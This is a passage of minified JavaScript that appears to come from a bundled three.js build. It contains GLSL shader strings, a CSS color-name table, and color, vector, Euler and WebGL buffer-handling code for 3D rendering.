<uv_vertex>\n\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\n#ifndef FLAT_SHADED // Normal computed with derivatives when FLAT_SHADED\n\n\tvNormal = normalize( transformedNormal );\n\n\t#ifdef USE_TANGENT\n\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\n\t#endif\n\n#endif\n\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || ( defined( USE_NORMALMAP ) && ! defined( OBJECTSPACE_NORMALMAP ) )\n\n\tvViewPosition = - mvPosition.xyz;\n\n#endif\n\n}\n",points_frag:"\nuniform vec3 diffuse;\nuniform float opacity;\n\n#include <common>\n#include <color_pars_fragment>\n#include <map_particle_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n\t#include <clipping_planes_fragment>\n\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\n\t#include <logdepthbuf_fragment>\n\t#include <map_particle_fragment>\n\t#include <color_fragment>\n\t#include <alphatest_fragment>\n\n\toutgoingLight = diffuseColor.rgb;\n\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\n}\n",points_vert:"\nuniform float size;\nuniform float scale;\n\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <color_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <project_vertex>\n\n\tgl_PointSize = size;\n\n\t#ifdef USE_SIZEATTENUATION\n\n\t\tbool isPerspective = ( projectionMatrix[ 2 ][ 3 ] == - 1.0 );\n\n\t\tif ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );\n\n\t#endif\n\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <fog_vertex>\n\n}\n",shadow_frag:"\nuniform vec3 color;\nuniform float opacity;\n\n#include <common>\n#include <packing>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\n\nvoid main() {\n\n\tgl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );\n\n\t#include <fog_fragment>\n\n}\n",shadow_vert:"\n#include <fog_pars_vertex>\n#include <shadowmap_pars_vertex>\n\nvoid main() {\n\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n\n}\n",sprite_frag:"\nuniform vec3 diffuse;\nuniform float opacity;\n\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n\t#include <clipping_planes_fragment>\n\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <alphatest_fragment>\n\n\toutgoingLight = diffuseColor.rgb;\n\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\n}\n",sprite_vert:"\nuniform float rotation;\nuniform vec2 center;\n\n#include <common>\n#include <uv_pars_vertex>\n#include <fog_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\nvoid main() {\n\n\t#include <uv_vertex>\n\n\tvec4 mvPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\n\n\tvec2 scale;\n\tscale.x = length( vec3( modelMatrix[ 0 ].x, modelMatrix[ 0 ].y, modelMatrix[ 0 ].z ) );\n\tscale.y = length( vec3( modelMatrix[ 1 ].x, modelMatrix[ 1 ].y, modelMatrix[ 1 ].z ) );\n\n\t#ifndef USE_SIZEATTENUATION\n\n\t\tbool isPerspective = ( projectionMatrix[ 2 ][ 3 ] == - 1.0 );\n\n\t\tif ( isPerspective ) scale *= - mvPosition.z;\n\n\t#endif\n\n\tvec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;\n\n\tvec2 rotatedPosition;\n\trotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\n\trotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\n\n\tmvPosition.xy += rotatedPosition;\n\n\tgl_Position = projectionMatrix * mvPosition;\n\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n\n}\n"},xe={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};function be(t,e,i){return void 0===e&&void 0===i?this.set(t):this.setRGB(t,e,i)}Object.assign(be.prototype,{isColor:!0,r:1,g:1,b:1,set:function(t){return t&&t.isColor?this.copy(t):"number"==typeof t?this.setHex(t):"string"==typeof t&&this.setStyle(t),this},setScalar:function(t){return this.r=t,this.g=t,this.b=t,this},setHex:function(t){return t=Math.floor(t),this.r=(t>>16&255)/255,this.g=(t>>8&255)/255,this.b=(255&t)/255,this},setRGB:function(t,e,i){return this.r=t,this.g=e,this.b=i,this},setHSL:function(){function t(t,e,i){return i<0&&(i+=1),i>1&&(i-=1),i<1/6?t+6*(e-t)*i:i<.5?e:i<2/3?t+6*(e-t)*(2/3-i):t}return function(e,i,n){if(e=Zt.euclideanModulo(e,1),i=Zt.clamp(i,0,1),n=Zt.clamp(n,0,1),0===i)this.r=this.g=this.b=n;else{var r=n<=.5?n*(1+i):n+i-n*i,a=2*n-r;this.r=t(a,r,e+1/3),this.g=t(a,r,e),this.b=t(a,r,e-1/3)}return this}}(),setStyle:function(t){function e(t){void 0!==t&&parseFloat(t)}var i;if(i=/^((?:rgb|hsl)a?)\(\s*([^\)]*)\)/.exec(t)){var n,r=i[1],a=i[2];switch(r){case"rgb":case"rgba":if(n=/^(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(a))return this.r=Math.min(255,parseInt(n[1],10))/255,this.g=Math.min(255,parseInt(n[2],10))/255,this.b=Math.min(255,parseInt(n[3],10))/255,e(n[5]),this;if(n=/^(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(a))return this.r=Math.min(100,parseInt(n[1],10))/100,this.g=Math.min(100,parseInt(n[2],10))/100,this.b=Math.min(100,parseInt(n[3],10))/100,e(n[5]),this;break;case"hsl":case"hsla":if(n=/^([0-9]*\.?[0-9]+)\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(a)){var o=parseFloat(n[1])/360,s=parseInt(n[2],10)/100,l=parseInt(n[3],10)/100;return e(n[5]),this.setHSL(o,s,l)}}}else if(i=/^\#([A-Fa-f0-9]+)$/.exec(t)){var c,h=(c=i[1]).length;if(3===h)return this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===h)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}return t&&t.length>0&&void 0!==(c=xe[t])&&this.setHex(c),this},clone:function(){return new this.constructor(this.r,this.g,this.b)},copy:function(t){return this.r=t.r,this.g=t.g,this.b=t.b,this},copyGammaToLinear:function(t,e){return void 0===e&&(e=2),this.r=Math.pow(t.r,e),this.g=Math.pow(t.g,e),this.b=Math.pow(t.b,e),this},copyLinearToGamma:function(t,e){void 0===e&&(e=2);var i=e>0?1/e:1;return this.r=Math.pow(t.r,i),this.g=Math.pow(t.g,i),this.b=Math.pow(t.b,i),this},convertGammaToLinear:function(t){return this.copyGammaToLinear(this,t),this},convertLinearToGamma:function(t){return this.copyLinearToGamma(this,t),this},copySRGBToLinear:function(){function t(t){return t<.04045?.0773993808*t:Math.pow(.9478672986*t+.0521327014,2.4)}return function(e){return this.r=t(e.r),this.g=t(e.g),this.b=t(e.b),this}}(),copyLinearToSRGB:function(){function t(t){return t<.0031308?12.92*t:1.055*Math.pow(t,.41666)-.055}return function(e){return this.r=t(e.r),this.g=t(e.g),this.b=t(e.b),this}}(),convertSRGBToLinear:function(){return this.copySRGBToLinear(this),this},convertLinearToSRGB:function(){return this.copyLinearToSRGB(this),this},getHex:function(){return 255*this.r<<16^255*this.g<<8^255*this.b<<0},getHexString:function(){return("000000"+this.getHex().toString(16)).slice(-6)},getHSL:function(t){void 0===t&&(t={h:0,s:0,l:0});var e,i,n=this.r,r=this.g,a=this.b,o=Math.max(n,r,a),s=Math.min(n,r,a),l=(s+o)/2;if(s===o)e=0,i=0;else{var c=o-s;switch(i=l<=.5?c/(o+s):c/(2-o-s),o){case n:e=(r-a)/c+(r<a?6:0);break;case r:e=(a-n)/c+2;break;case a:e=(n-r)/c+4}e/=6}return t.h=e,t.s=i,t.l=l,t},getStyle:function(){return"rgb("+(255*this.r|0)+","+(255*this.g|0)+","+(255*this.b|0)+")"},offsetHSL:(ve={},function(t,e,i){return this.getHSL(ve),ve.h+=t,ve.s+=e,ve.l+=i,this.setHSL(ve.h,ve.s,ve.l),this}),add:function(t){return this.r+=t.r,this.g+=t.g,this.b+=t.b,this},addColors:function(t,e){return this.r=t.r+e.r,this.g=t.g+e.g,this.b=t.b+e.b,this},addScalar:function(t){return this.r+=t,this.g+=t,this.b+=t,this},sub:function(t){return this.r=Math.max(0,this.r-t.r),this.g=Math.max(0,this.g-t.g),this.b=Math.max(0,this.b-t.b),this},multiply:function(t){return this.r*=t.r,this.g*=t.g,this.b*=t.b,this},multiplyScalar:function(t){return this.r*=t,this.g*=t,this.b*=t,this},lerp:function(t,e){return this.r+=(t.r-this.r)*e,this.g+=(t.g-this.g)*e,this.b+=(t.b-this.b)*e,this},lerpHSL:(_e={h:0,s:0,l:0},ge={h:0,s:0,l:0},function(t,e){this.getHSL(_e),t.getHSL(ge);var i=Zt.lerp(_e.h,ge.h,e),n=Zt.lerp(_e.s,ge.s,e),r=Zt.lerp(_e.l,ge.l,e);return this.setHSL(i,n,r),this}),equals:function(t){return t.r===this.r&&t.g===this.g&&t.b===this.b},fromArray:function(t,e){return void 0===e&&(e=0),this.r=t[e],this.g=t[e+1],this.b=t[e+2],this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this.r,t[e+1]=this.g,t[e+2]=this.b,t},toJSON:function(){return this.getHex()}});var we={common:{diffuse:{value:new be(15658734)},opacity:{value:1},map:{value:null},uvTransform:{value:new ie},alphaMap:{value:null}},specularmap:{specularMap:{value:null}},envmap:{envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},refractionRatio:{value:.98},maxMipLevel:{value:0}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1}},emissivemap:{emissiveMap:{value:null}},bumpmap:{bumpMap:{value:null},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalScale:{value:new Jt(1,1)}},displacementmap:{displacementMap:{value:null},displacementScale:{value:1},displacementBias:{value:0}},roughnessmap:{roughnessMap:{value:null}},metalnessmap:{metalnessMap:{value:null}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new be(16777215)}},lights:{ambientLightColor:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},spotShadowMap:{value:[]},spotShadowMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}}},points:{diffuse:{value:new be(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},uvTransform:{value:new ie}},sprite:{diffuse:{value:new be(15658734)},opacity:{value:1},center:{value:new Jt(.5,.5)},rotation:{value:0},map:{value:null},uvTransform:{value:new ie}}};function Te(t){var e={};for(var i in t)for(var n in e[i]={},t[i]){var r=t[i][n];r&&(r.isColor||r.isMatrix3||r.isMatrix4||r.isVector2||r.isVector3||r.isVector4||r.isTexture)?e[i][n]=r.clone():Array.isArray(r)?e[i][n]=r.slice():e[i][n]=r}return e}function Se(t){for(var e={},i=0;i<t.length;i++){var n=Te(t[i]);for(var r in n)e[r]=n[r]}return e}var Me,Ee={clone:Te,merge:Se},Le={basic:{uniforms:Se([we.common,we.specularmap,we.envmap,we.aomap,we.lightmap,we.fog]),vertexShader:ye.meshbasic_vert,fragmentShader:ye.meshbasic_frag},lambert:{uniforms:Se([we.common,we.specularmap,we.envmap,we.aomap,we.lightmap,we.emissivemap,we.fog,we.lights,{emissive:{value:new be(0)}}]),vertexShader:ye.meshlambert_vert,fragmentShader:ye.meshlambert_frag},phong:{uniforms:Se([we.common,we.specularmap,we.envmap,we.aomap,we.lightmap,we.emissivemap,we.bumpmap,we.normalmap,we.displacementmap,we.gradientmap,we.fog,we.lights,{emissive:{value:new be(0)},specular:{value:new be(1118481)},shininess:{value:30}}]),vertexShader:ye.meshphong_vert,fragmentShader:ye.meshphong_frag},standard:{uniforms:Se([we.common,we.envmap,we.aomap,we.lightmap,we.emissivemap,we.bumpmap,we.normalmap,we.displacementmap,we.roughnessmap,we.metalnessmap,we.fog,we.lights,{emissive:{value:new be(0)},roughness:{value:.5},metalness:{value:.5},envMapIntensity:{value:1}}]),vertexShader:ye.meshphysical_vert,fragmentShader:ye.meshphysical_frag},matcap:{uniforms:Se([we.common,we.bumpmap,we.normalmap,we.displacementmap,we.fog,{matcap:{value:null}}]),vertexShader:ye.meshmatcap_vert,fragmentShader:ye.meshmatcap_frag},points:{uniforms:Se([we.points,we.fog]),vertexShader:ye.points_vert,fragmentShader:ye.points_frag},dashed:{uniforms:Se([we.common,we.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:ye.linedashed_vert,fragmentShader:ye.linedashed_frag},depth:{uniforms:Se([we.common,we.displacementmap]),vertexShader:ye.depth_vert,fragmentShader:ye.depth_frag},normal:{uniforms:Se([we.common,we.bumpmap,we.normalmap,we.displacementmap,{opacity:{value:1}}]),vertexShader:ye.normal_vert,fragmentShader:ye.normal_frag},sprite:{uniforms:Se([we.sprite,we.fog]),vertexShader:ye.sprite_vert,fragmentShader:ye.sprite_frag},background:{uniforms:{uvTransform:{value:new ie},t2D:{value:null}},vertexShader:ye.background_vert,fragmentShader:ye.background_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:ye.cube_vert,fragmentShader:ye.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:ye.equirect_vert,fragmentShader:ye.equirect_frag},distanceRGBA:{uniforms:Se([we.common,we.displacementmap,{referencePosition:{value:new ee},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:ye.distanceRGBA_vert,fragmentShader:ye.distanceRGBA_frag},shadow:{uniforms:Se([we.lights,we.fog,{color:{value:new be(0)},opacity:{value:1}}]),vertexShader:ye.shadow_vert,fragmentShader:ye.shadow_frag}};function ke(t,e,i,n){this.x=t||0,this.y=e||0,this.z=i||0,this.w=void 0!==n?n:1}function Ae(t){var e=new WeakMap;return{get:function(t){return t.isInterleavedBufferAttribute&&(t=t.data),e.get(t)},remove:function(i){i.isInterleavedBufferAttribute&&(i=i.data);var n=e.get(i);n&&(t.deleteBuffer(n.buffer),e.delete(i))},update:function(i,n){i.isInterleavedBufferAttribute&&(i=i.data);var r=e.get(i);void 0===r?e.set(i,function(e,i){var n=e.array,r=e.dynamic?t.DYNAMIC_DRAW:t.STATIC_DRAW,a=t.createBuffer();t.bindBuffer(i,a),t.bufferData(i,n,r),e.onUploadCallback();var o=t.FLOAT;return n instanceof Float32Array?o=t.FLOAT:n instanceof Float64Array||(n instanceof Uint16Array?o=t.UNSIGNED_SHORT:n instanceof Int16Array?o=t.SHORT:n instanceof Uint32Array?o=t.UNSIGNED_INT:n instanceof Int32Array?o=t.INT:n instanceof Int8Array?o=t.BYTE:n instanceof Uint8Array&&(o=t.UNSIGNED_BYTE)),{buffer:a,type:o,bytesPerElement:n.BYTES_PER_ELEMENT,version:e.version}}(i,n)):r.version<i.version&&(function(e,i,n){var r=i.array,a=i.updateRange;t.bindBuffer(n,e),!1===i.dynamic?t.bufferData(n,r,t.STATIC_DRAW):-1===a.count?t.bufferSubData(n,0,r):0===a.count||(t.bufferSubData(n,a.offset*r.BYTES_PER_ELEMENT,r.subarray(a.offset,a.offset+a.count)),a.count=-1)}(r.buffer,i,n),r.version=i.version)}}}function Pe(t,e,i,n,r,a){this.a=t,this.b=e,this.c=i,this.normal=n&&n.isVector3?n:new ee,this.vertexNormals=Array.isArray(n)?n:[],this.color=r&&r.isColor?r:new be,this.vertexColors=Array.isArray(r)?r:[],this.materialIndex=void 0!==a?a:0}function Oe(t,e,i,n){this._x=t||0,this._y=e||0,this._z=i||0,this._order=n||Oe.DefaultOrder}function Ce(){this.mask=1}Le.physical={uniforms:Se([Le.standard.uniforms,{clearCoat:{value:0},clearCoatRoughness:{value:0}}]),vertexShader:ye.meshphysical_vert,fragmentShader:ye.meshphysical_frag},Object.assign(ke.prototype,{isVector4:!0,set:function(t,e,i,n){return this.x=t,this.y=e,this.z=i,this.w=n,this},setScalar:function(t){return this.x=t,this.y=t,this.z=t,this.w=t,this},setX:function(t){return this.x=t,this},setY:function(t){return this.y=t,this},setZ:function(t){return this.z=t,this},setW:function(t){return this.w=t,this},setComponent:function(t,e){switch(t){case 0:this.x=e;break;case 1:this.y=e;break;case 2:this.z=e;break;case 3:this.w=e;break;default:throw new Error("index is out of range: "+t)}return this},getComponent:function(t){switch(t){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+t)}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(t){return this.x=t.x,this.y=t.y,this.z=t.z,this.w=void 0!==t.w?t.w:1,this},add:function(t,e){return void 0!==e?this.addVectors(t,e):(this.x+=t.x,this.y+=t.y,this.z+=t.z,this.w+=t.w,this)},addScalar:function(t){return this.x+=t,this.y+=t,this.z+=t,this.w+=t,this},addVectors:function(t,e){return this.x=t.x+e.x,this.y=t.y+e.y,this.z=t.z+e.z,this.w=t.w+e.w,this},addScaledVector:function(t,e){return this.x+=t.x*e,this.y+=t.y*e,this.z+=t.z*e,this.w+=t.w*e,this},sub:function(t,e){return void 0!==e?this.subVectors(t,e):(this.x-=t.x,this.y-=t.y,this.z-=t.z,this.w-=t.w,this)},subScalar:function(t){return this.x-=t,this.y-=t,this.z-=t,this.w-=t,this},subVectors:function(t,e){return this.x=t.x-e.x,this.y=t.y-e.y,this.z=t.z-e.z,this.w=t.w-e.w,this},multiplyScalar:function(t){return this.x*=t,this.y*=t,this.z*=t,this.w*=t,this},applyMatrix4:function(t){var e=this.x,i=this.y,n=this.z,r=this.w,a=t.elements;return this.x=a[0]*e+a[4]*i+a[8]*n+a[12]*r,this.y=a[1]*e+a[5]*i+a[9]*n+a[13]*r,this.z=a[2]*e+a[6]*i+a[10]*n+a[14]*r,this.w=a[3]*e+a[7]*i+a[11]*n+a[15]*r,this},divideScalar:function(t){return this.multiplyScalar(1/t)},setAxisAngleFromQuaternion:function(t){this.w=2*Math.acos(t.w);var e=Math.sqrt(1-t.w*t.w);return e<1e-4?(this.x=1,this.y=0,this.z=0):(this.x=t.x/e,this.y=t.y/e,this.z=t.z/e),this},setAxisAngleFromRotationMatrix:function(t){var e,i,n,r,a=t.elements,o=a[0],s=a[4],l=a[8],c=a[1],h=a[5],u=a[9],d=a[2],p=a[6],f=a[10];if(Math.abs(s-c)<.01&&Math.abs(l-d)<.01&&Math.abs(u-p)<.01){if(Math.abs(s+c)<.1&&Math.abs(l+d)<.1&&Math.abs(u+p)<.1&&Math.abs(o+h+f-3)<.1)return this.set(1,0,0,0),this;e=Math.PI;var m=(o+1)/2,_=(h+1)/2,g=(f+1)/2,v=(s+c)/4,y=(l+d)/4,x=(u+p)/4;return m>_&&m>g?m<.01?(i=0,n=.707106781,r=.707106781):(n=v/(i=Math.sqrt(m)),r=y/i):_>g?_<.01?(i=.707106781,n=0,r=.707106781):(i=v/(n=Math.sqrt(_)),r=x/n):g<.01?(i=.707106781,n=.707106781,r=0):(i=y/(r=Math.sqrt(g)),n=x/r),this.set(i,n,r,e),this}var b=Math.sqrt((p-u)*(p-u)+(l-d)*(l-d)+(c-s)*(c-s));return Math.abs(b)<.001&&(b=1),this.x=(p-u)/b,this.y=(l-d)/b,this.z=(c-s)/b,this.w=Math.acos((o+h+f-1)/2),this},min:function(t){return this.x=Math.min(this.x,t.x),this.y=Math.min(this.y,t.y),this.z=Math.min(this.z,t.z),this.w=Math.min(this.w,t.w),this},max:function(t){return this.x=Math.max(this.x,t.x),this.y=Math.max(this.y,t.y),this.z=Math.max(this.z,t.z),this.w=Math.max(this.w,t.w),this},clamp:function(t,e){return this.x=Math.max(t.x,Math.min(e.x,this.x)),this.y=Math.max(t.y,Math.min(e.y,this.y)),this.z=Math.max(t.z,Math.min(e.z,this.z)),this.w=Math.max(t.w,Math.min(e.w,this.w)),this},clampScalar:function(){var t,e;return function(i,n){return void 0===t&&(t=new ke,e=new ke),t.set(i,i,i,i),e.set(n,n,n,n),this.clamp(t,e)}}(),clampLength:function(t,e){var i=this.length();return this.divideScalar(i||1).multiplyScalar(Math.max(t,Math.min(e,i)))},floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this},roundToZero:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this.w=this.w<0?Math.ceil(this.w):Math.floor(this.w),this},negate:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this},dot:function(t){return this.x*t.x+this.y*t.y+this.z*t.z+this.w*t.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length()||1)},setLength:function(t){return this.normalize().multiplyScalar(t)},lerp:function(t,e){return this.x+=(t.x-this.x)*e,this.y+=(t.y-this.y)*e,this.z+=(t.z-this.z)*e,this.w+=(t.w-this.w)*e,this},lerpVectors:function(t,e,i){return this.subVectors(e,t).multiplyScalar(i).add(t)},equals:function(t){return t.x===this.x&&t.y===this.y&&t.z===this.z&&t.w===this.w},fromArray:function(t,e){return void 0===e&&(e=0),this.x=t[e],this.y=t[e+1],this.z=t[e+2],this.w=t[e+3],this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this.x,t[e+1]=this.y,t[e+2]=this.z,t[e+3]=this.w,t},fromBufferAttribute:function(t,e,i){return this.x=t.getX(e),this.y=t.getY(e),this.z=t.getZ(e),this.w=t.getW(e),this}}),i(49),i(112),i(90),i(91),i(113),i(92),i(114),i(154),Object.assign(Pe.prototype,{clone:function(){return(new this.constructor).copy(this)},copy:function(t){this.a=t.a,this.b=t.b,this.c=t.c,this.normal.copy(t.normal),this.color.copy(t.color),this.materialIndex=t.materialIndex;for(var e=0,i=t.vertexNormals.length;e<i;e++)this.vertexNormals[e]=t.vertexNormals[e].clone();for(e=0,i=t.vertexColors.length;e<i;e++)this.vertexColors[e]=t.vertexColors[e].clone();return this}}),Oe.RotationOrders=["XYZ","YZX","ZXY","XZY","YXZ","ZYX"],Oe.DefaultOrder="XYZ",Object.defineProperties(Oe.prototype,{x:{get:function(){return this._x},set:function(t){this._x=t,this.onChangeCallback()}},y:{get:function(){return this._y},set:function(t){this._y=t,this.onChangeCallback()}},z:{get:function(){return this._z},set:function(t){this._z=t,this.onChangeCallback()}},order:{get:function(){return this._order},set:function(t){this._order=t,this.onChangeCallback()}}}),Object.assign(Oe.prototype,{isEuler:!0,set:function(t,e,i,n){return this._x=t,this._y=e,this._z=i,this._order=n||this._order,this.onChangeCallback(),this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._order)},copy:function(t){return this._x=t._x,this._y=t._y,this._z=t._z,this._order=t._order,this.onChangeCallback(),this},setFromRotationMatrix:function(t,e,i){var 